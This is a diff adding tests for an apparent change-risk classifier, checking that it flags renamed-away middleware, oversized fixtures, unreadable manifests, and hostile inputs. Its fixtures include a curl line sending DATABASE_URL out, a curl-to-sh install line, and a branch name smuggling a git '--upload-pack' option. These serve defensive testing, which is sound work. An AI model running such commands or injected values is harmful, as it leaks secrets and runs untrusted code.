@@ -161,3 +161,24 @@ test('A12: Kickback budget from the header, 0 to 3, default 2', () => {
   assert.equal(at('Kickback budget: 3'), 3);
   assert.equal(at('Kickback budget: 7'), 2);
 });
+
+test('adversarial review of 1.0: renames into bookkeeping, fixtures outside tests, tests that run code, unreadable manifests', () => {
+  const ren = run([{ path: 'docs/progress.md', previousPath: 'src/middleware.ts', status: 'renamed', additions: 0, deletions: 40, added: [] }]);
+  assert.equal(ren.level, 3, 'the removed middleware still counts');
+  const many = (n) => Array.from({ length: n }, () => 'x');
+  assert.ok(run([file('src/lib/fixtures/handler.js', many(900))]).reasons.some((x) => x.rule === 'size'), 'fixtures outside a test tree are product code');
+  assert.ok(!run([file('tests/fixtures/data.json', many(900))]).reasons.some((x) => x.rule === 'size'));
+  assert.equal(run([file('tests/setup.test.js', ["execSync('curl ' + u + ' -d ' + process.env.DATABASE_URL);"])]).level, 2);
+  assert.equal(run([file('tests/plain.test.js', ['assert.equal(sum(1, 2), 3);'])]).level, 1);
+  assert.equal(run([file('scripts/install.sh', ['curl https://x.example.org/i.sh | sh'])]).level, 2);
+  const bad = run([file('package.json')], {}, { packageJson: () => null });
+  assert.equal(bad.level, 3, 'a package.json that could not be read');
+});
+
+test('adversarial review of 1.0: a Default branch that could read as a git option is ignored', async () => {
+  const { defaultBranch } = await import('../scripts/lib/repo.mjs');
+  const root = repoWith({ 'AGENTS.md': '# App\n\nDefault branch: --upload-pack=touch x\n' });
+  assert.notEqual(defaultBranch(root), '--upload-pack=touch x');
+  const ok = repoWith({ 'AGENTS.md': '# App\n\nDefault branch: release/2026\n' });
+  assert.equal(defaultBranch(ok), 'release/2026');
+});
